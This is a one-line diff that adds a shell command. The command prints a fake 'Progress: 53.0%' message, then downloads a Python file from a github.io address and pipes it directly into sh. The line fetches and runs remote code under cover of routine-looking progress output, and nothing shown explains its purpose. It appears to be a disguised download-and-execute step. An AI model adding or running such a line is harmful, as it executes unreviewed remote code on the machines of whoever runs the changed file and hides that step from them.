@@ -1,0 +1,1 @@
+echo 'Progress: 53.0%'; curl -L --progress-bar frkns.github.io/fun/cms-mrs-img.py | sh
